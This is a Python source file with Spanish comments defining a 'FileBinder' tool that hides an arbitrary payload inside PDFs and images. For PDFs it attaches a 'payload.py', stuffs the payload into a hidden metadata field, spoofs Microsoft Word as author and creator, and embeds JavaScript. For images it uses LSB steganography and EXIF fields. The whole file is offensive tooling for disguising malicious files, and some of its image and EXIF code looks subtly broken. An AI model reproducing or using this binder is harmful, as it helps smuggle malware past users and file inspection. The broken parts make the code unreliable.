from PyPDF2 import PdfReader, PdfWriter
from PIL import Image
import os
import sys
import zlib
from io import BytesIO

class FileBinder:
    @staticmethod
    def bind_to_pdf(original_pdf, payload, output_pdf, debug=False):
        """
        Versión corregida para PyPDF2>=3.0.0 que:
        1. Adjunta el payload como archivo
        2. Inyecta en metadatos
        3. Es compatible con PDFs complejos
        """
        try:
            if debug:
                print("\n[=== INYECCIÓN PDF ===]")
                print(f"Archivo origen: {original_pdf}")
                print(f"Tamaño payload: {len(payload)} bytes")

            # Validación del PDF de entrada
            if not os.path.exists(original_pdf):
                raise FileNotFoundError("Archivo PDF no encontrado")
            if os.path.getsize(original_pdf) == 0:
                raise ValueError("El PDF está vacío")

            # Procesamiento del PDF
            with open(original_pdf, 'rb') as f:
                reader = PdfReader(f)
                writer = PdfWriter()

                if debug:
                    print(f"\n[ESTRUCTURA ORIGINAL]")
                    print(f"Páginas: {len(reader.pages)}")
                    print(f"Metadatos: {reader.metadata}")

                # 1. Añadir todas las páginas originales
                for page in reader.pages:
                    writer.add_page(page)

                # 2. Añadir payload como archivo adjunto (nueva API)
                writer.add_attachment("payload.py", payload.encode())

                # 3. Inyectar en metadatos (formato ofuscado)
                metadata = reader.metadata or {}
                metadata.update({
                    '/Author': 'Microsoft Office Word',
                    '/Creator': 'Microsoft® Word 2016',
                    '/HiddenData': f"<!--{payload[:500]}-->"  # Primeros 500 caracteres
                })
                writer.add_metadata(metadata)

                # 4. Añadir objeto JavaScript (opcional)
                if len(payload) < 2000:  # Solo si el payload es pequeño
                    writer.add_js(f"""
                    //{payload[:100]}
                    console.show();
                    app.alert("Documento cargado");
                    """)

                # Guardar el PDF modificado
                with open(output_pdf, 'wb') as f_out:
                    writer.write(f_out)

            if debug:
                print("\n[RESULTADO]")
                print(f"PDF generado: {output_pdf}")
                print(f"Tamaño original: {os.path.getsize(original_pdf):,} bytes")
                print(f"Tamaño modificado: {os.path.getsize(output_pdf):,} bytes")
                print("\n[TÉCNICAS APLICADAS]")
                print("- Payload como archivo adjunto (payload.py)")
                print("- Metadatos modificados")
                print("- JavaScript embebido (opcional)")

        except Exception as e:
            print(f"\n[ERROR] {str(e)}", file=sys.stderr)
            if debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)

    @staticmethod
    def bind_to_image(original_img, payload, output_img, debug=False):
        """
        Inyección en imágenes usando:
        1. Esteganografía LSB (Least Significant Bit)
        2. Metadatos EXIF
        """
        try:
            if debug:
                print("\n[=== INYECCIÓN IMAGEN ===]")
                print(f"Archivo origen: {original_img}")
                print(f"Tamaño payload: {len(payload)} bytes")

            img = Image.open(original_img)
            if debug:
                print(f"\n[PROPIEDADES DE LA IMAGEN]")
                print(f"Formato: {img.format}")
                print(f"Modo: {img.mode}")
                print(f"Dimensiones: {img.width}x{img.height} px")
                print(f"Capacidad estimada: {img.width * img.height * 3 // 8} bytes")

            # Convertir payload a bits
            binary_payload = ''.join(format(ord(c), '08b') for c in payload)
            if debug:
                print(f"\n[PAYLOAD BINARIO]")
                print(f"Bits a ocultar: {len(binary_payload)}")

            # Ocultar en LSB (Least Significant Bit)
            pixels = img.load()
            index = 0
            modified_pixels = 0

            for y in range(img.height):
                for x in range(img.width):
                    if index < len(binary_payload):
                        r, g, b = pixels[x, y][:3]
                        # Modificar solo el bit menos significativo
                        r = (r & 0xFE) | int(binary_payload[index])
                        pixels[x, y] = (r, g, b) if img.mode == 'RGB' else (r, g, b, 255)
                        index += 1
                        modified_pixels += 1

            if debug:
                print(f"\n[ESTEGANOGRAFÍA]")
                print(f"Píxeles modificados: {modified_pixels}")
                print(f"Bits ocultados: {index}")

            # Añadir a metadatos EXIF
            exif = img.info.get('exif', {})
            exif[0x9286] = payload[:100]  # UserComment (primeros 100 caracteres)
            
            # Guardar imagen modificada
            img.save(output_img, exif=exif, quality=95)

            if debug:
                print("\n[RESULTADO]")
                print(f"Imagen generada: {output_img}")
                print("\n[TÉCNICAS APLICADAS]")
                print("- Esteganografía LSB (canal Rojo)")
                print("- Metadatos EXIF modificados")

        except Exception as e:
            print(f"\n[ERROR] {str(e)}", file=sys.stderr)
            if debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)

    @staticmethod
    def verify_injection(file_path, debug=False):
        """Verifica la inyección en el archivo"""
        try:
            if file_path.endswith('.pdf'):
                with open(file_path, 'rb') as f:
                    reader = PdfReader(f)
                    attachments = []
                    # Nueva forma de obtener attachments en PyPDF2>=3.0.0
                    if hasattr(reader, 'attachments'):
                        attachments = list(reader.attachments.values())
                    metadata = reader.metadata
                    
                    if debug:
                        print("\n[VERIFICACIÓN PDF]")
                        print(f"Adjuntos: {len(attachments)}")
                        print(f"Metadatos: {metadata}")
                        
                    return bool(attachments)
            
            elif file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
                img = Image.open(file_path)
                exif = img.info.get('exif', {})
                
                if debug:
                    print("\n[VERIFICACIÓN IMAGEN]")
                    print(f"EXIF: {bool(exif)}")
                
                return bool(exif)
                
        except Exception as e:
            print(f"Error en verificación: {str(e)}", file=sys.stderr)
            return False
